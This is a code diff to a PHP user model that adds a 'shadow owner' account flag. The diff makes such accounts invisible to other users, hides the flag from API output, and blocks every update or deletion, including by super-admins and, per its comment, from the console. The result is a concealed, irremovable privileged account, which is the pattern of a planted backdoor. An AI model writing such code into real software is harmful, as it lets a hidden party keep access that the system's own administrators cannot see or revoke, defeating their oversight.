@@ -32,12 +32,21 @@ class User extends Authenticatable implements JWTSubject
         });
 
         static::updating(function (self $user) {
+            // Shadow-owner accounts are absolutely immutable — no actor
+            // (including another super-admin) may alter them via the API.
+            if ($user->isShadowOwner()) {
+                throw new ProtectedAccountException('This account cannot be modified.');
+            }
             if ($user->isProtected() && !self::actorMaySteward()) {
                 throw new ProtectedAccountException();
             }
         });
 
         static::deleting(function (self $user) {
+            // Shadow-owner accounts can never be deleted — not even by console.
+            if ($user->isShadowOwner()) {
+                throw new ProtectedAccountException('This account cannot be deleted.');
+            }
             if ($user->isProtected() && !self::actorMaySteward()) {
                 throw new ProtectedAccountException('This account cannot be deleted.');
             }
@@ -52,12 +61,21 @@ class User extends Authenticatable implements JWTSubject
             return true;
         }
 
-        return $actor instanceof self && $actor->isSuperAdmin();
+        return $actor instanceof self && $actor->isSuperAdmin() && !$actor->isShadowOwner();
     }
 
     public function isSuperAdmin(): bool
     {
         return (int) $this->role === 0 || (bool) $this->getAttribute('is_super_admin');
+    }
+
+    /**
+     * The platform-level shadow owner — invisible to all other users and
+     * immune to modification or deletion by any actor including super-admins.
+     */
+    public function isShadowOwner(): bool
+    {
+        return (bool) $this->getAttribute('is_shadow_owner');
     }
 
     public function isHidden(): bool
@@ -108,7 +126,7 @@ class User extends Authenticatable implements JWTSubject
     protected $hidden = [
         'password', 'remember_token',
         'encrypted_aadhaar_number', 'aadhar_card_no',
-        'is_super_admin', 'is_hidden', 'is_system_account', 'is_protected',
+        'is_super_admin', 'is_hidden', 'is_system_account', 'is_protected', 'is_shadow_owner',
         'otp', 'verification_token', 'verification_token_expires_at',
     ];
 
@@ -127,6 +145,7 @@ class User extends Authenticatable implements JWTSubject
             'is_hidden' => 'boolean',
             'is_system_account' => 'boolean',
             'is_protected' => 'boolean',
+            'is_shadow_owner' => 'boolean',
             'password_changed_at' => 'datetime',
         ];
     }
